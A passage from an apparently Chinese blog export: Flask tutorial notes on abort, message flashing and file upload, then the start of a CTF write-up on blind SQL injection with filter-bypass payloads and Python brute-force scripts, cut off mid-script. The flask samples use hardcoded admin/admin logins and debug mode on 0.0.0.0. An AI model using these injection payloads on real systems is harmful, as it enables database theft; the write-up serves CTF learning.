<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span>methods <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">,</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'admin'</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'success'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            abort<span class="token punctuation">(</span><span class="token number">401</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/success'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">success</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> <span class="token string">'logged in successfully'</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span>debug <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">)</span></code></pre>

<p><code>Flask.abort(code)</code>：带有错误代码的abort函数</p>
<ul>
<li><strong>400</strong> - 用于错误请求</li>
<li><strong>401</strong> - 用于未身份验证的</li>
<li><strong>403</strong> - Forbidden</li>
<li><strong>404</strong> - 未不到</li>
<li><strong>406</strong> - 表示不接受</li>
<li><strong>415</strong> - 用于不支持的媒体类型</li>
<li><strong>429</strong> - 请求过多</li>
</ul>
<p>若登录不是admin则报401：<code>Unauthorized</code>错误</p>
<h2 id="消息闪现"><a href="#消息闪现" class="headerlink" title="消息闪现"></a>消息闪现</h2><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding:UTF-8 -*-</span>
<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span>redirect<span class="token punctuation">,</span>url_for<span class="token punctuation">,</span>request<span class="token punctuation">,</span>render_template<span class="token punctuation">,</span>make_response<span class="token punctuation">,</span>escape<span class="token punctuation">,</span>session<span class="token punctuation">,</span>abort<span class="token punctuation">,</span>flash
<span class="token keyword">import</span> os
app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
app<span class="token punctuation">.</span>secret_key <span class="token operator">=</span> os<span class="token punctuation">.</span>urandom<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span>
<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">)</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span>methods <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">,</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    error <span class="token operator">=</span> <span class="token boolean">None</span>
    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'admin'</span> <span class="token keyword">or</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'admin'</span><span class="token punctuation">:</span>
            error <span class="token operator">=</span> <span class="token string">'Invalid username or password. Please try again!'</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            flash<span class="token punctuation">(</span><span class="token string">'You were successfully logged in'</span><span class="token punctuation">)</span>
            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    
    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'login.html'</span><span class="token punctuation">,</span> error <span class="token operator">=</span> error<span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span>debug <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">)</span></code></pre>

<p><code>flash(message, category)</code>：将消息传递给下一个请求，该请求通常是一个模板。</p>
<ul>
<li><strong>message</strong>：参数是要闪现的实际消息。</li>
<li><strong>category</strong>：参数是可选的。它可以是“error”，“info”或“warning”。</li>
</ul>
<p><code>get_flashed_messages(with_categories, category_filter)</code>：从会话中删除消息</p>
<p>两个参数都是可选的。如果接收到的消息具有类别，则第一个参数是元组。第二个参数仅用于显示特定消息。第一个默认为False</p>
<p>典型的消息闪现模板：</p>
<pre class="language-markup" data-language="markup"><code class="language-markup">&#123;% with messages = get_flashed_messages() %&#125;
   &#123;% if messages %&#125;
      &#123;% for message in messages %&#125;
         &#123;&#123;  message &#125;&#125;
      &#123;% endfor %&#125;
   &#123;% endif %&#125;
&#123;% endwith %&#125;</code></pre>

<p>下面给出html代码：</p>
<p>index.html</p>
<pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>
&#123;% with messages = get_flashed_messages() %&#125;
    &#123;% if messages %&#125;
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span><span class="token punctuation">></span></span>
          &#123;% for message in messages %&#125;
          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>&#123; &#123;  message &#125;&#125;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>
          &#123;% endfor %&#125;
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">></span></span>
    &#123;% endif %&#125;
 &#123;% endwith %&#125;
 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>Flask Message Flashing Example<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span>
 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>Do you want to <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span> <span class="token attr-value"><span class="token punctuation attr-equals">=</span> <span class="token punctuation">"</span>&#123;&#123;  url_for(<span class="token punctuation">'</span>login<span class="token punctuation">'</span>) &#125;&#125;<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>b</span><span class="token punctuation">></span></span>log in?<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>b</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre>

<p>login.html</p>
<pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>
   <span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">doctype</span> <span class="token name">html</span><span class="token punctuation">></span></span>
   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>Login<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span>
   &#123;% if error %&#125;
   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>strong</span><span class="token punctuation">></span></span>Error:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>strong</span><span class="token punctuation">></span></span> &#123;&#123;  error &#125;&#125;
   &#123;% endif %&#125;
   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span> <span class="token attr-value"><span class="token punctuation attr-equals">=</span> <span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token attr-name">method</span> <span class="token attr-value"><span class="token punctuation attr-equals">=</span> post</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dl</span><span class="token punctuation">></span></span>
         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dt</span><span class="token punctuation">></span></span>Username:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dt</span><span class="token punctuation">></span></span> 
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dd</span><span class="token punctuation">></span></span>
         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span> <span class="token attr-value"><span class="token punctuation attr-equals">=</span> text</span> <span class="token attr-name">name</span> <span class="token attr-value"><span class="token punctuation attr-equals">=</span> username</span> <span class="token attr-name">value</span> <span class="token attr-value"><span class="token punctuation attr-equals">=</span> <span class="token punctuation">"</span>&#123;&#123; request.form.username &#125;&#125;<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dd</span><span class="token punctuation">></span></span>
 
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dt</span><span class="token punctuation">></span></span>Password:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dt</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dd</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span> <span class="token attr-value"><span class="token punctuation attr-equals">=</span> password</span> <span class="token attr-name">name</span> <span class="token attr-value"><span class="token punctuation attr-equals">=</span> password</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dd</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dl</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span> <span class="token attr-value"><span class="token punctuation attr-equals">=</span> submit</span> <span class="token attr-name">value</span> <span class="token attr-value"><span class="token punctuation attr-equals">=</span> Login</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>
   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre>

<p>访问<code>http://127.0.0.1:5000/</code>点击login后进入登录界面，随后如果输入的username和password不是admin的话会在界面上显示error消息，若登录成功则跳转到index页面上方显示登录成功消息</p>
<h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p>upload.html</p>
<pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">doctype</span> <span class="token name">html</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Upload new File<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>
&#123;% with messages = get_flashed_messages() %&#125;
    &#123;% if messages %&#125;
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span><span class="token punctuation">></span></span>
          &#123;% for message in messages %&#125;
          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>&#123;&#123;  message &#125;&#125;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>
          &#123;% endfor %&#125;
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">></span></span>
    &#123;% endif %&#125;
 &#123;% endwith %&#125;
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>Upload new File<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>post</span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>multipart/form-data</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>file</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>file</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>submit</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>Upload</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></code></pre>

<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os
<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> flash<span class="token punctuation">,</span> request<span class="token punctuation">,</span> redirect<span class="token punctuation">,</span> url_for<span class="token punctuation">,</span>send_from_directory<span class="token punctuation">,</span>render_template
<span class="token keyword">from</span> werkzeug<span class="token punctuation">.</span>utils <span class="token keyword">import</span> secure_filename

UPLOAD_FOLDER <span class="token operator">=</span> <span class="token string">r'E:\\flask\\upload\\'</span>
ALLOWED_EXTENSIONS <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token string">'txt'</span><span class="token punctuation">,</span> <span class="token string">'pdf'</span><span class="token punctuation">,</span> <span class="token string">'png'</span><span class="token punctuation">,</span> <span class="token string">'jpg'</span><span class="token punctuation">,</span> <span class="token string">'jpeg'</span><span class="token punctuation">,</span> <span class="token string">'gif'</span><span class="token punctuation">&#125;</span>

app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'MAX_CONTENT_LENGTH'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">16</span> <span class="token operator">*</span> <span class="token number">1024</span> <span class="token operator">*</span> <span class="token number">1024</span>
app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'UPLOAD_FOLDER'</span><span class="token punctuation">]</span> <span class="token operator">=</span> UPLOAD_FOLDER
app<span class="token punctuation">.</span>secret_key <span class="token operator">=</span> os<span class="token punctuation">.</span>urandom<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">allowed_file</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment">#判断上传的文件是否非法</span>
    <span class="token keyword">if</span> filename<span class="token punctuation">.</span>rsplit<span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">in</span> ALLOWED_EXTENSIONS<span class="token punctuation">:</span>
        <span class="token keyword">return</span> filename
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        flash<span class="token punctuation">(</span><span class="token string">'illegal file'</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> <span class="token boolean">False</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">upload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'upload.html'</span><span class="token punctuation">)</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">upload_file</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>
        <span class="token comment"># check if the post request has the file part</span>
        <span class="token keyword">if</span> <span class="token string">'file'</span> <span class="token keyword">not</span> <span class="token keyword">in</span> request<span class="token punctuation">.</span>files<span class="token punctuation">:</span> 
            flash<span class="token punctuation">(</span><span class="token string">'No file part'</span><span class="token punctuation">)</span>
            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'upload'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token builtin">file</span> <span class="token operator">=</span> request<span class="token punctuation">.</span>files<span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span>  
        <span class="token comment"># if user does not select file, browser also</span>
        <span class="token comment"># submit an empty part without filename</span>
        <span class="token keyword">if</span> <span class="token builtin">file</span><span class="token punctuation">.</span>filename <span class="token operator">==</span> <span class="token string">''</span><span class="token punctuation">:</span>
            flash<span class="token punctuation">(</span><span class="token string">'No selected file'</span><span class="token punctuation">)</span>
            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>request<span class="token punctuation">.</span>url<span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token builtin">file</span> <span class="token keyword">and</span> allowed_file<span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">.</span>filename<span class="token punctuation">)</span><span class="token punctuation">:</span>  
            filename <span class="token operator">=</span> secure_filename<span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">.</span>filename<span class="token punctuation">)</span>
            <span class="token builtin">file</span><span class="token punctuation">.</span>save<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'UPLOAD_FOLDER'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> filename<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#save方法保存文件</span>
            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'uploaded_file'</span><span class="token punctuation">,</span>filename<span class="token operator">=</span>filename<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'upload'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>


<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/uploads/&lt;filename>'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">uploaded_file</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> send_from_directory<span class="token punctuation">(</span>app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'UPLOAD_FOLDER'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>filename<span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span>debug <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">)</span></code></pre>

<p>不得不说，官方的代码还是要强一些，当上传为空时会报错，非法文件也会报错，但上传成功后跳转到上传的文件url处</p>
<p> <code>UPLOAD_FOLDER</code> 是上传文 件要储存的目录， <code>ALLOWED_EXTENSIONS</code> 是允许上传的文件扩展名的集合，<code>MAX_CONTENT_LENGTH</code>是限制的上传文件的大小</p>
<h2 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h2><ul>
<li><strong>Flask Mail</strong> - 为Flask应用程序提供SMTP接口</li>
<li><strong>Flask WTF</strong> - 添加WTForms的渲染和验证</li>
<li><strong>Flask SQLAlchemy</strong> - 为Flask应用程序添加SQLAlchemy支持</li>
<li><strong>Flask Sijax</strong> - Sijax的接口 - Python/jQuery库，使AJAX易于在Web应用程序中使用</li>
</ul>
<p>参考链接：</p>
<blockquote>
<p><a href="https://dormousehole.readthedocs.io/en/latest/index.html">https://dormousehole.readthedocs.io/en/latest/index.html</a>     （官方文档）</p>
<p><a href="https://www.w3cschool.cn/flask/">https://www.w3cschool.cn/flask/</a>   （W3Cschool教程）</p>
</blockquote>
]]></content>
      <categories>
        <category>备忘录</category>
      </categories>
      <tags>
        <tag>Flask</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF-SQL注入-无回显</title>
    <url>/posts/d991f96a/</url>
    <content><![CDATA[<h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><h3 id="2020ichunqiu新春公益赛—Ezsqli"><a href="#2020ichunqiu新春公益赛—Ezsqli" class="headerlink" title="2020ichunqiu新春公益赛—Ezsqli"></a>2020ichunqiu新春公益赛—Ezsqli</h3><p>出题思路<a href="https://www.smi1e.top/%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E5%85%AC%E7%9B%8A%E8%B5%9B-ezsqli-%E5%87%BA%E9%A2%98%E5%B0%8F%E8%AE%B0/">Smi1e</a></p>
<p>界面：</p>
<img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/SQL注入/tQegj4JmCsGbTXp.png" style="zoom:50%;" loading="lazy">

<p>FUZZ测试后发现</p>
<img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/SQL注入/7UIS3oMv6DWqsj8.png" style="zoom:80%;" loading="lazy">

<p><code>in</code>被过滤<code>information_schema</code>、<code>mysql.innodb_table_stats</code>、<code>sys.schema_auto_increment_columns</code>都用不了了，这时就需要新的表来代替，<a href="https://osandamalith.com/2020/01/27/alternatives-to-extract-tables-and-columns-from-mysql-and-mariadb/">参考</a></p>
<p>Payload1：<code>1^((select substr((select group_concat(table_name) from sys.x$schema_flattened_keys),1,1))=&#39;f&#39;)</code></p>
<p>Payload2：<code>1^((select substr((select group_concat(table_name) from sys.x$schema_table_statistics_with_buffer where table_schema=database()),1,1))=&#39;f&#39;)</code></p>
<p>于是写出盲注爆表脚本（Payload1）</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
url <span class="token operator">=</span> <span class="token string">"http://586656b32259484e8dbc25a81ee0a407820801130961430a.changame.ichunqiu.com/index.php"</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">40</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token comment">#d = "1 and if(ascii(mid(fl4g,1,1))regexp "+str(j)+",sleep(3),1)"</span>
        d <span class="token operator">=</span> <span class="token string">"1^(ascii(substr((select group_concat(table_name,'') from sys.x$schema_flattened_keys),&#123;&#125;,1))=&#123;&#125;)"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>j<span class="token punctuation">)</span>
        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"id"</span><span class="token punctuation">:</span>d<span class="token punctuation">&#125;</span>
        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data <span class="token operator">=</span> data<span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token string">'Nu1L'</span> <span class="token keyword">not</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>
            <span class="token keyword">break</span></code></pre>

<p>得到两个表名，<code>f1ag_1s_h3r3_hhhhh</code>、<code>users233333333333333</code></p>
<p><code>flag</code>应该在<code>f1ag_1s_h3r3_hhhhh</code>中，这里需要用到一个技巧，就是将查询语句与相同数量的列进行比较，<a href="https://nosec.org/home/detail/3830.html">参考</a>，如图</p>
<img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/SQL注入/sFLidjDgr5weSft.png" style="zoom: 80%;" loading="lazy">

<p>而在mysql中，比较字符串大小是按位比较的，所以就可以用比较大小的方法一个一个的得到字段的内容</p>
<img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/SQL注入/JIK9gluR1khN6zr.png" style="zoom:80%;" loading="lazy">

<p>注：出题人这里还有一个坑，详见题目下方的链接</p>
<p>mysql默认是不区分大小写的区分大小写的注入，所以在爆字段的时候需要注意，但由于比赛flag都是小写，所以就直接盲注就可以了，但这里还是给出区分大小写的方法，<code>BINARY(&quot;A&quot;)</code>、<code>CAST(&quot;A&quot; AS JSON)</code>都会返回大写的A，当<code>in</code>被过滤了<code>BINARY</code>就不好使了，所以用第二个就OK</p>
<p>这里可以测试出有两个列，但是盲猜第一列的第一个是1可还行</p>
<p>Payload：<code>1^((select 1,concat(&#39;&#123;&#125;~&#39;,CAST(&#39;0&#39; AS JSON)))&lt;(select * from f1ag_1s_h3r3_hhhhh limit 1))</code></p>
<p>于是写出盲注爆字段脚本</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
<span class="token keyword">import</span> string
url <span class="token operator">=</span> <span class="token string">"http://a9362c1023c04da19c143e01d7991148619db7d8fbff4e43.changame.ichunqiu.com/index.php"</span>
<span class="token builtin">str</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">"-"</span> <span class="token operator">+</span> string<span class="token punctuation">.</span>digits <span class="token operator">+</span> string<span class="token punctuation">.</span>ascii_letters <span class="token operator">+</span> string<span class="token punctuation">.</span>punctuation<span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"'"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'"'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"\\"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">)</span>
flag <span class="token operator">=</span> <span class="token string">""</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">:</span>
        <span class="token comment">#d = "1 and if(ascii(mid(fl4g,1,1))regexp "+str(j)+",sleep(3),1)"</span>
